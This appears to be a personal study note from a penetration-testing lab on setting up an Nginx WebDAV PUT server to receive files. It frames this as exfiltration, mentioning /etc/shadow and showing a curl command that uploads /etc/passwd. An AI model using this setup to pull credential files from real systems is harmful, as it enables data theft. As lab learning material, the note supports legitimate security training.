<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Nginx / Apache Server for filetransfer</title>
</head><body>Both Nginix and Apache generally work for setting up a upload server for file transfer.<br/>
Problem is Apache has so many sec. issues since it just executes almost everything with .php<br/>
And we could shooto urselves in the foot.<br/>
Why do that at all? - <ul><li style="list-style-type: none">well just using a http server for upload might raise an alarm when sending passwords or /etc/shadow file in plain text </li>
<li style="list-style-type: none"></li>
</ul>
Setting up Nginx:<br/>
<br/>
Create Dir to hadnle Upload Files:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory</li>
</ul>
Change the owner to www-data:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory</li>
</ul>
Creating a nginx config file here:<ul><li style="list-style-type: none">/etc/nginx/sites-available/upload.conf </li>
<li style="list-style-type: none">Containing:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">server {</li>
<li style="list-style-type: none">&nbsp; &nbsp; listen 9001;</li>
<li style="list-style-type: none">&nbsp; &nbsp; </li>
<li style="list-style-type: none">&nbsp; &nbsp; location /SecretUploadDirectory/ {</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; root &nbsp; &nbsp;/var/www/uploads;</li>
<li style="list-style-type: none">&nbsp; &nbsp; &nbsp; &nbsp; dav_methods PUT;</li>
<li style="list-style-type: none">&nbsp; &nbsp; }}</li>
</ul>
</li>
</ul>
</li>
</ul>
Symlink or Site to the sites-enabled Dir:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/</li>
</ul>
Start Nginx:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ sudo systemctl restart nginx.service</li>
</ul>
If error check: <ul><li style="list-style-type: none">/var/log/nginx/error.log</li>
</ul>
f.e port 80 already in use:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ tail -2 /var/log/nginx/error.log</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)</li>
<li style="list-style-type: none">2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()</li>
</ul>
</li>
</ul>
workaround:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default</li>
</ul>
Now we can upload files using curl:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt</li>
</ul>
And catch them:<ul><li style="list-style-type: none">sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt </li>
</ul>
</body></html>